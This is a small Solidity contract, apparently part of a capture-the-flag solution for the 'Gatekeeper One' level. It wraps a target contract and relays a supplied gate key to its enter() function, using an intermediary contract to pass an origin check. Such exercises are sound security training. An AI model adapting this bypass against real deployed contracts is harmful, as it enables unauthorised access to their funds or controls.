// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneHack {

    GatekeeperOne target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function relay(bytes8 _gateKey) public {

        target.enter(_gateKey);
    }

}